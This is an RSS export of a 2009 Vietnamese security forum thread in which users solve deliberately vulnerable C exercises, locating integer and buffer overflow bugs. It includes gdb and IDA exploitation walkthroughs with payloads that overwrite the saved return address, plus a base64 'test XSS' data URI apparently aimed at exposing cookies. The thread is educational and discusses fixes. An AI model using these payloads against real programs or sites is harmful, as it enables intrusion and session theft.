<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "giúp mình tìm lỗi mấy chương trình C này với "]]></title>
		<link>/hvaonline/posts/list/23.html</link>
		<description><![CDATA[Latest messages posted in the topic "giúp mình tìm lỗi mấy chương trình C này với "]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Chào các bạn,

Vừa rồi mình có học một cái môn bàn về các vấn đề của ngôn ngữ C. Thầy mình có cho một số bài tập, mà mình thấy vừa hay vừa khó. Có vài bài mình giải được, nhưng cũng có vài bài mình không biết cách giải (nhưng thầy đã giải luôn rồi), và cũng có vài bài mình tự chế ra. Mình sẽ lần lượt gửi lên đây, nếu có nhiều bạn hứng thú với đề tài này. Tất cả các bài dưới đây, mục tiêu là chỉ ra lỗi, sau đó crash (hay tốt hơn là exploit luôn) chương trình nếu được. Mình thích mấy bài trả lời chỉ ra lỗi cặn kẽ hơn là những bài trả lời chỉ crash chương trình không thôi.

Bài 1:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 3&#41; 
       return 1;
   unsigned short int x = strlen&#40;argv&#91;1&#93;&#41; + strlen&#40;argv&#91;2&#93;&#41;;   
   char *buf = &#40;char *&#41;malloc&#40;x&#41;;
   strcpy&#40;buf, argv&#91;1&#93;&#41;;
   strcat&#40;buf, argv&#91;2&#93;&#41;;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170355</guid>
				<link>/hvaonline/posts/list/27801.html#170355</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 04:50:15]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Bài thứ 2:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main&#40;int argc, char **argv&#41;
{
    int x, y;
    if &#40;argc != 3&#41;
        return 0;
    x = atoi&#40;argv&#91;1&#93;&#41;;
    y = atoi&#40;argv&#91;2&#93;&#41;;
    return y?x/y:0;
}</pre>
		</div>

Cập nhật: cái bài này mình viết sai một chỗ, thay vì dòng cuối phải là <b>return y?x/y:0;</b> thì mình lại viết nhầm thành <b>return x?x/y:0;</b>. Bây giờ đã sửa lại rồi đó.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170356</guid>
				<link>/hvaonline/posts/list/27801.html#170356</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 04:56:11]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Bài 3:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 2&#41; 
       return 0;
   safe_strcpy&#40;argv&#91;1&#93;, strlen&#40;argv&#91;1&#93;&#41;&#41;; 
}

void safe_strcpy&#40;char* mybuffer, char mylen&#41;
{
   char maxlen = 63;
   char buffer&#91;64&#93;;

   if&#40;mylen &lt; maxlen&#41;
   {
      //it's safe now
      strcpy&#40;buffer, mybuffer&#41;;
   }
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170357</guid>
				<link>/hvaonline/posts/list/27801.html#170357</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 05:01:39]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Tạm thời 3 bài vậy nhen. Bạn nào giải được, nếu muốn cho người khác xem thì cứ gửi lên đây, không thích thì PM mình cũng được.

Hint chung cho ba bài này: *******. Mình sẽ tiết lộ cái hint gồm 7 chữ cái này nếu sau vài ngày mà không có bạn nào làm được hết.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170358</guid>
				<link>/hvaonline/posts/list/27801.html#170358</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 05:09:42]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Bài 1:

1. strlen trả về unsigned int (4 byte), trong khi x được khai báo là unsigned short int (2 byte). Tràn số nguyên.

2. strcpy sẽ đặt thêm ký tự kết thúc chuỗi vào chuối nên tổng độ lớn của bộ đệm phải là x+1. Ở đây là tràn 1 ký tự NUL.

Bài 2:

Không biết là lỗi hay là được thiết kế như vậy, nhưng giá trị thoát của một chương trình chỉ từ 0 tới 255. Cho nên giá trị thoát của chương trình này có thể sẽ không là giá trị mong muốn.

Bài 3:

strlen trả về unsigned int, trong khi hàm nhận vào char. Nếu argv[1] dài hơn 127 ký tự, thì so sánh mylen &lt; maxlen thành công.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170397</guid>
				<link>/hvaonline/posts/list/27801.html#170397</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 14:05:50]]> GMT</pubDate>
				<author><![CDATA[ lamer]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Hahaha lúc gửi bài này, mình đã ngờ là sẽ có bạn lamer vào trả lời rồi :-p. Anyway, hai bài 1, 3 chính xác rồi. Chúc mừng bạn nha.

Quan sát của bạn lamer ở bài số 2 rất hay, nhưng mà vẫn còn có cách hay hơn, crash được cả chương trình.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170401</guid>
				<link>/hvaonline/posts/list/27801.html#170401</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 15:02:29]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Mình chờ người khác chỉ lỗi của bài 2 vậy.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170407</guid>
				<link>/hvaonline/posts/list/27801.html#170407</link>
				<pubDate><![CDATA[Sat, 21 Feb 2009 15:47:24]]> GMT</pubDate>
				<author><![CDATA[ lamer]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Có lẽ các bài này hơi khó, nên đến giờ, ngoài bạn lamer ra, vẫn chưa có bạn nào submit lời giải hết trơn. Àh mình muốn thêm một yêu cầu nữa: ngoài phân tích lỗi, đưa cách khai thác, thì phải viết luôn phần sửa lỗi nha.

Bài 4 này có vẻ dễ nè (bạn lamer thôi đừng làm bài này, mình sẽ có bài khác dành cho bạn :p):

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

void func&#40;char *p&#41; {
   char buf&#91;10+1&#93;;
   memset&#40;buf, 0, sizeof&#40;buf&#41;&#41;;
   
   // 10 chars only
   sprintf&#40;buf, "%10s", p&#41;;
   printf&#40;"Hello, %s\n", buf&#41;;
}

int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 2&#41;
       return 1;

   func&#40;argv&#91;1&#93;&#41;;   
}</pre>
		</div>

]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170804</guid>
				<link>/hvaonline/posts/list/27801.html#170804</link>
				<pubDate><![CDATA[Tue, 24 Feb 2009 18:39:57]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Mạn phép trả lời bài 3, có gì sai các bác sửa dùm,
Phân tích lỗi:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int main&#40;int argc, char **argv&#41; {
    if &#40;argc != 2&#41; 
        return 0;
    safe_strcpy&#40;argv&#91;1&#93;, strlen&#40;argv&#91;1&#93;&#41;&#41;; 
 }
 
 void safe_strcpy&#40;char* mybuffer, char mylen&#41;
 {
    char maxlen = 63;
    char buffer&#91;64&#93;;
 
    if&#40;mylen &lt; maxlen&#41;
    {
              strcpy&#40;buffer, mybuffer&#41;;
     }
}</pre>
		</div>
Như bác lamer đã nói, strlen(argv[1]) trả về kiểu unsign int (kiểu int, 4 byte, không dấu) nghĩa là giá trị của nó từ 0 -&gt; 2^32 -1, giá trị của tham số mylen của safe_strcpy kiểu char (mặc định char là singed char) có dung lương 1 byte (có dấu) (bit vị trí cao nhất là bit dấu) nên giá trị dao động từ <font color='yellow'>-128 --&gt; 127</font> (<font color='yellow'>-2^(n-1) --&gt; 2^(n-1) -1</font>)
khi ta nhập argv[1] của main có giá trị &gt; 127, qua phép ép kiểu "char mylen" của hàm safe_strcppy, ta làm bit cao nhất của char mylen bật lên = 1 --&gt; thành số âm
nên điều kiện 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>if&#40;mylen &lt; maxlen&#41; luôn đúng</pre>
		</div>
B. Khai thác.
Load lên = IDA, Nhìn stack frame của safe_string
<br>
			<div align="center" class="limitview"><img src='http://img5.imageshack.us/img5/8449/img1k.jpg' border="0" onload="maxImg(this, 500px);" /></div>
ta thấy dòng 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>lea eax, &#91;ebp - dest&#93; //dest = -44h = 68</pre>
		</div>
&lt;--&gt;
lea eax, [ebp - 68]
vậy cái buffer[64] nằm cách ebp 68 byte, ta chỉ cần 72 byte là overwrite saved main's EBP, 76 byte là overwrite saved main's EIP

Khai thác thử:
(<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>gdb&#41; run `python -c 'print "A" * 72 + "B" * 4 + "C" * 100'`
The program being debugged has been started already.
Start it from the beginning? &#40;y or n&#41; y
Starting program: /home/twilight/crackme.de/choc/bai3 `python -c 'print "A" * 72 + "B" * 4 + "C" * 100'`

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? &#40;&#41;
&#40;gdb&#41;&#40;gdb&#41; disassemble safe_strcpy 
Dump of assembler code for function safe_strcpy:
0x080484b0 &lt;safe_strcpy+0&gt;:     push   %ebp
0x080484b1 &lt;safe_strcpy+1&gt;:     mov    %esp,%ebp
0x080484b3 &lt;safe_strcpy+3&gt;:     sub    $0x58,%esp
0x080484b6 &lt;safe_strcpy+6&gt;:     mov    0xc&#40;%ebp&#41;,%eax
0x080484b9 &lt;safe_strcpy+9&gt;:     mov    %al,0xffffffff&#40;%ebp&#41;
0x080484bc &lt;safe_strcpy+12&gt;:    movb   $0x3f,0xfffffffe&#40;%ebp&#41;
0x080484c0 &lt;safe_strcpy+16&gt;:    mov    0xffffffff&#40;%ebp&#41;,%al
0x080484c3 &lt;safe_strcpy+19&gt;:    cmp    0xfffffffe&#40;%ebp&#41;,%al
0x080484c6 &lt;safe_strcpy+22&gt;:    jge    0x80484db &lt;safe_strcpy+43&gt;
0x080484c8 &lt;safe_strcpy+24&gt;:    add    $0xfffffff8,%esp
0x080484cb &lt;safe_strcpy+27&gt;:    mov    0x8&#40;%ebp&#41;,%eax
0x080484ce &lt;safe_strcpy+30&gt;:    push   %eax
0x080484cf &lt;safe_strcpy+31&gt;:    lea    0xffffffbc&#40;%ebp&#41;,%eax
0x080484d2 &lt;safe_strcpy+34&gt;:    push   %eax
0x080484d3 &lt;safe_strcpy+35&gt;:    call   0x8048378 &lt;strcpy@plt&gt;
0x080484d8 &lt;safe_strcpy+40&gt;:    add    $0x10,%esp
0x080484db &lt;safe_strcpy+43&gt;:    mov    %ebp,%esp
0x080484dd &lt;safe_strcpy+45&gt;:    pop    %ebp
0x080484de &lt;safe_strcpy+46&gt;:    ret</pre>
		</div>


(<blockquote>gdb) break *safe_strcpy +46


(gdb) run `python -c 'print "A" * 72 + "B" * 4 + "C" * 100'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/twilight/crackme.de/choc/bai3 `python -c 'print "A" * 72 + "B" * 4 + "C" * 100'`

Breakpoint 1, 0x080484de in safe_strcpy ()
(gdb) x/100xb $esp
<font color='red'>0xbffff64c</font>:     <font color='orange'>0x42    0x42    0x42    0x42</font>    0x43    0x43    0x43    0x43
0xbffff654:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff65c:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff664:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff66c:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff674:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff67c:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff684:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff68c:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff694:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff69c:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff6a4:     0x43    0x43    0x43    0x43    0x43    0x43    0x43    0x43
0xbffff6ac:     0x43    0x43    0x43    0x43&nbsp;
		</blockquote>

chạy thử với shell code đơn giản: (tạo ngắt hệ thống):
<blockquote>(gdb) run `python -c 'print "A" * 72 + "\x4c\xf6\xff\xbf" + "\x90"* 100 + "\xcc"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/twilight/crackme.de/choc/bai3 `python -c 'print "A" * 72 + "\x4c\xf6\xff\xbf" + "\x90"* 100 + "\xcc"'`

Breakpoint 1, 0x080484de in safe_strcpy ()
(gdb) continue 
Continuing.

Program received <font color='yellow'>signal SIGTRAP, Trace/breakpoint trap</font>.&nbsp;
		</blockquote>

C. Sửa lỗi:
1. cho cái
char mylen
thành 
unsigned int mylen
2. dùng strncpy thay cho strcpy
EOF



]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170816</guid>
				<link>/hvaonline/posts/list/27801.html#170816</link>
				<pubDate><![CDATA[Tue, 24 Feb 2009 19:17:10]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Bài số 5:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 2&#41; 
       return 0;
   int MAXC = 100;
   char *buffer;
   int len = atoi&#40;argv&#91;1&#93;&#41;;
   if &#40;!&#40;buffer = &#40;char *&#41; malloc&#40;MAXC&#41;&#41;&#41; 
       return -1;
   if &#40;len &lt; 0 || len + 1 &gt;= MAXC&#41; {
       free&#40;buffer&#41;;
       return -1;    
   }   
   if &#40;read&#40;0, buffer, len&#41; &lt;= 0&#41; {
       free&#40;buffer&#41;;
       return -1;
   }
   buffer&#91;len&#93; = '\0';
   printf&#40;"you entered: %s\n", buffer&#41;;
   return 0;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170857</guid>
				<link>/hvaonline/posts/list/27801.html#170857</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 01:42:38]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ còn bài 2 lỗi chỗ nào vậy?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170863</guid>
				<link>/hvaonline/posts/list/27801.html#170863</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 02:48:44]]> GMT</pubDate>
				<author><![CDATA[ lamer]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @twilight: cảm ơn bạn đã tham gia và trả lời rất rõ ràng. Tuy vậy mình thấy có vài chỗ chưa chính xác lắm trong bài của bạn:

1. signed char nằm trong range [-128, 127]. Nói chung, các signed type đều có giá trị từ [-2^(N-1), 2^(N-1) -1], trong đó N là width của kiểu đó. Làm sao biết chắc là signed char biểu diễn được số -128?

Số nhỏ nhất mà kiểu char biểu diễn được là số khi biểu diễn binary có dạng: 1000 0000. Muốn biết số này là số nào, chỉ cần lấy bù 2 của nó:

* đảo bit: 0111 1111 = 127

* cộng 1: 127 + 1 = 128

nên số nhỏ nhất mà nó biểu diễn được chính là -128.

2. Không phải lúc nào ép kiểu từ unsigned int &gt; 127 xuống signed char cũng cho ra giá trị âm hay làm cho phép so sánh mylen &lt; maxlen luôn đúng. Cái này bạn lamer cũng nhầm (hay chỉ là trả lời chưa hết ý). Ví dụ như mình chạy cái bài 3 với input là 320 ký tự thì nó vẫn chạy được, kô bị segfault.

<blockquote>
$ ./puzzle3 `perl -e 'print "A" x 320'`
&nbsp;
		</blockquote> 

Lý do chính là khi thực hiện ép kiểu như thế, compiler sẽ thực hiện truncation, bỏ mấy cái bit không xài của unsigned int, chỉ lấy 8 bit cuối mà thôi. Nên nếu bit thứ 8 (tính từ LSB) của số unsigned int mà là số 0, thì kết quả vẫn là một số dương. Ví dụ như số 320 ở trên, có dạng hexa là 0x0140, nghĩa là byte cuối của nó có giá trị là 0x40 = 64 &gt; 63, nên chương trình thoát ra bình thường, không gọi hàm strcpy.

Dựa vào ý này, giờ mình sửa bài 3 thành thế này, bạn thử exploit nó xem:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int main&#40;int argc, char **argv&#41; {
    if &#40;argc != 2&#41; 
        return 0;
    safe_strcpy&#40;argv&#91;1&#93;, strlen&#40;argv&#91;1&#93;&#41;&#41;; 
 }
 
 void safe_strcpy&#40;char* mybuffer, char mylen&#41;
 {
    char maxlen = 63;
    char buffer&#91;64&#93;;
 
    if&#40;0 &lt; mylen &lt; maxlen&#41;
    {
              strcpy&#40;buffer, mybuffer&#41;;
     }
}</pre>
		</div>

3. Mình nghĩ sử dụng strncpy không phải là giải pháp hay. Bạn thử đọc man page của strncpy xem thì sẽ hiểu ý mình. Vả lại mình thấy chính vì mấy thứ như strncpy này mà cái dạng lỗi ở những bài này mới trở nên phổ biến. Lập trình sư cứ tưởng sử dụng strncpy là an toàn, nhưng do tính toán giá trị tham số n sai, dẫn đến thảm họa. Nên mình nghĩ tốt nhất là hiểu vấn đề, sử dụng cho đúng cách, dẫu là công cụ dở, hơn là chọn công cụ tốt, mà do không hiểu vấn đề, nên cũng làm sai luôn. 

Tiếp tục làm đi twilight :-p, mình sẽ gửi tiếp vài bài nữa.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170866</guid>
				<link>/hvaonline/posts/list/27801.html#170866</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 03:39:04]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @lamer: kiên nhẫn tí đi, giờ đưa kết quả, nhỡ đâu có bạn đang làm chưa ra thì uổng công cho bạn đó lắm.

Mới chế ra một bài tặng bạn lamer nè:

Bài 6 (chỉ cần chỉ ra lỗi):

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

int main&#40;int argc, char **argv&#41; {
   int TOTAL = 10;  
   int input&#91;TOTAL&#93;;
   int ind, value;
   char buffer1&#91;12&#93;, buffer2&#91;12&#93;;      
   //init
   int i;
   for&#40;i=0; i&lt;TOTAL; i++&#41; {
       input&#91;i&#93; = 0;
   }
   //get input from user
   while &#40;1&#41; {
       read&#40;0, buffer1, sizeof&#40;buffer1&#41;&#41;; 
       ind = atoi&#40;buffer1&#41;;
       if &#40;-1 == ind&#41; break;
       read&#40;0, buffer2, sizeof&#40;buffer2&#41;&#41;;
       value = atoi&#40;buffer2&#41;;
       if &#40;ind &lt; 0&#41; {
          //get its absolute value, help prevent writing to memory locations outside the array boundary
          ind = -ind;
       }
       input&#91;ind % TOTAL&#93; = value;
   }
   //do something interesting here with the input, like find its maximum
   for&#40;i=0; i&lt;TOTAL; i++&#41; {
       printf&#40;"%d: %d\n", i, input&#91;i&#93;&#41;;
   }
   return 0;
}</pre>
		</div>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170868</guid>
				<link>/hvaonline/posts/list/27801.html#170868</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 05:03:59]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ -0x80000000 = -0x80000000]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170892</guid>
				<link>/hvaonline/posts/list/27801.html#170892</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 11:18:04]]> GMT</pubDate>
				<author><![CDATA[ lamer]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @choc: thanks bác đã chỉ ra chỗ sai cơ bản của mình :( 

tiếp
<blockquote>int main(int argc, char **argv) {
     if (argc != 2) 
         return 0;
     safe_strcpy(argv[1], strlen(argv[1])); 
  }
  
  void safe_strcpy(char* mybuffer, char mylen)
  {
     char maxlen = 63;
     char buffer[64];
  
     if(<font color='yellow'>0 &lt; mylen &lt; maxlen</font>)
     {
               strcpy(buffer, mybuffer);
      }
 }&nbsp;
		</blockquote>
mình dùng gcc 3.3.6 thì khi compile chạy tốt nhưng ko đúng theo điều kiện if, mình phải sửa lại
thay 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>if&#40;0 &lt; mylen &lt; maxlen&#41;</pre>
		</div>
thành 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>if&#40;&#40;0 &lt; mylen&#41; &&&#40;mylen &lt; maxlen&#41;&#41;</pre>
		</div>
cho đúng ý bạn :D

như vầy vẫn exploit được, vì chỉ cần input khi biểu diễn dạng nhị phân sao cho 8 byte cuối là số dương &lt; 63, còn byte thứ 9 trở đi thì bị truncate cũng đc, nhưng khi strcpy thỏa, nó bị buffer overflow:
Ví dụ khi mình nhập input là 257
biểu dẫn ở dạng binary của unsigned int
--&gt; 
0000 0001     0000 0001

--&gt; khi ép kiểu qua char --&gt; 8 byte bị truncate sẽ là 0000 0001 = 1 thập phân 

--&gt; điều kiện để strcpy thỏa 0&lt; 1 &lt;63 và vẫn bị segmentation fault
<blockquote>twilight@h4x0r:~/crackme.de/choc$ ./bai3 `python -c 'print "A" * 257'`
v (core dumped)&nbsp;
		</blockquote>

<blockquote>twilight@h4x0r:~/crackme.de/choc$ ./bai3 `python -c 'print "A" * 319'`
twilight@h4x0r:~/crackme.de/choc$&nbsp;
		</blockquote>
len(input) = 319 chạy bình thường do 319 = 256 + 63 bắt đầu vi phạm điều kiện &lt;63

<font color='yellow'>Cứ như thế, nó sẽ có từng khoảng từng khoảng rờ rạc nhau có thể làm cho chương trình  bị Segmentation fault, nếu bác nào có shellcode quá lớn cho mục đích nào đó, cứ dùng các bit cao từ 9 trở đi :D</font>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170913</guid>
				<link>/hvaonline/posts/list/27801.html#170913</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 12:05:51]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ @twilight: bravo. Tiếp đi bạn. Mấy bài này hay ở chỗ là nhiều khi chỉ giao binary không giao source code thì vẫn có thể exploit được. Nhưng đưa source code (tưởng là dễ hơn) lại không nhìn thấy lỗi.

@lamer: mình hâm mộ bạn quá đi. Hay là hai đứa mình học chung lớp nhỉ? Nhưng mà mình không thích cách giải của bạn, cụt lủng, ngắn ngủn, không có giải thích chi hết. Àh hay là bạn định để dành để mở thêm một lớp "Advanced Software Exploitation"? :-D.

BTW, hint cho bài 2: ép kiểu của return, làm sao để return một số, mà số đó, khi bị ép sang int thì bị lỗi.

]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170931</guid>
				<link>/hvaonline/posts/list/27801.html#170931</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 12:41:10]]> GMT</pubDate>
				<author><![CDATA[ choc_]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ đây là file binary của bai3, khi compiler bằng gcc3.3.6 với source-code của choc_
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>int main&#40;int argc, char **argv&#41; {
if &#40;argc != 2&#41;
return 0;
safe_strcpy&#40;argv&#91;1&#93;, strlen&#40;argv&#91;1&#93;&#41;&#41;;
}

void safe_strcpy&#40;char* mybuffer, char mylen&#41;
{
char maxlen = 63;
char buffer&#91;64&#93;;

if&#40;0 &lt; mylen &lt; maxlen&#41;
{
strcpy&#40;buffer, mybuffer&#41;;
}
}</pre>
		</div>
--&gt;
<span class="link"> http://www.mediafire.com/?9dmhy9ymwwm</span>
test XSS
<span class="link"> data:text/html;base64,PGEgaHJlZj0iZGF0YTp0ZXh0L2h0bWw7YmFzZTY0LFBITmpjbWx3ZEQ1aGJHVnlkQ2hrYjJOMWJXVnVkQzVqYjI5cmFXVXBQQzl6WTNKcGNIUSsiPjxmb250IGNvbG9yPSJ5ZWxsb3ciPlNob3cgQ29va2llczwvZm9udD48L2E+</span>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170932</guid>
				<link>/hvaonline/posts/list/27801.html#170932</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 12:44:34]]> GMT</pubDate>
				<author><![CDATA[ twilight]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ Tui đọc tới đọc lui, đọc xuôi đọc ngược mà chả thấy bài 2 có bug gì cả. Đại ca _choc chỉ giùm em đi. Làm sao mà nó crash được, hay vậy ?]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/27801.html#170958</guid>
				<link>/hvaonline/posts/list/27801.html#170958</link>
				<pubDate><![CDATA[Wed, 25 Feb 2009 14:15:29]]> GMT</pubDate>
				<author><![CDATA[ TQN]]></author>
			</item>
			<item>
				<title>Re: giúp mình tìm lỗi mấy chương trình C này với </title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">choc_ wrote:</cite><br>
		<blockquote>Có lẽ các bài này hơi khó, nên đến giờ, ngoài bạn lamer ra, vẫn chưa có bạn nào submit lời giải hết trơn. Àh mình muốn thêm một yêu cầu nữa: ngoài phân tích lỗi, đưa cách khai thác, thì phải viết luôn phần sửa lỗi nha.

Bài 4 này có vẻ dễ nè (bạn lamer thôi đừng làm bài này, mình sẽ có bài khác dành cho bạn :p):

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

void func&#40;char *p&#41; {
   char buf&#91;10+1&#93;;
   memset&#40;buf, 0, sizeof&#40;buf&#41;&#41;;
   
   // 10 chars only
   sprintf&#40;buf, "%10s", p&#41;;
   printf&#40;"Hello, %s\n", buf&#41;;
}

int main&#40;int argc, char **argv&#41; {
   if &#40;argc != 2&#41;
       return 1;

   func&#40;argv&#91;1&#93;&#41;;   
}</pre>
		</div>

&nbsp;
		</blockquote>
Lời giải bài 4:
Lỗi nằm ở chỗ hàm sprintf(buf, "%10s", p); ghi đè của gia trị p trỏ đến vào buf mà ko kiểm tra bound của source, dest.
Cái option "%10s", là giá trị trả về mặc định kiểu int của của sprintf = 10 nếu số byte của dest do p trỏ đến &lt;10.
Khai thác trường hợp này đơn giản như khai thác strcpy.
Load hàm func lên IDA:
<blockquote><font color='yellow'>s= byte ptr -0Ch</font>
arg_0= dword ptr  8

push    ebp             ; Alternative name is 'gcc2_compiled.'
mov     ebp, esp
sub     esp, 18h
add     esp, 0FFFFFFFCh
push    0Bh             ; n
push    0               ; c
lea     eax, [ebp+s]
push    eax             ; s
call    _memset
add     esp, 10h
add     esp, 0FFFFFFFCh
mov     eax, [ebp+arg_0]
push    eax
push    offset format   ; "%10s"
<font color='yellow'>lea     eax, [ebp+s]
push    eax             ; s
call    _sprintf</font>
add     esp, 10h
add     esp, 0FFFFFFF8h
lea     eax, [ebp+s]
push    eax
push    offset aHelloS  ; "Hello, %s\n"
call    _printf
add     esp, 10h
mov     esp, ebp
pop     ebp
retn
func endp&nbsp;
		</blockquote>
quan sát ta thấy 
lea eax, [ebp +s]
nhìn lên khúc đầu thấy biến s = -0C
--&gt; 
lea eax, [ebp -12]
Nghĩa là cái buffer cách saved EBP của main 12 byte, --&gt; cần 8 byte nữa để overwrite saved EIP của main
--&gt;
<blockquote>(gdb) run `python -c 'print "A" * 16 + "B" * 4'`
Starting program: /home/twilight/crackme.de/choc/bai4 `python -c 'print "A" * 16 + "B" * 4'`

Breakpoint 1, 0x080484c9 in func ()
(gdb) continue 
Continuing.
Hello, AAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/20xb $esp

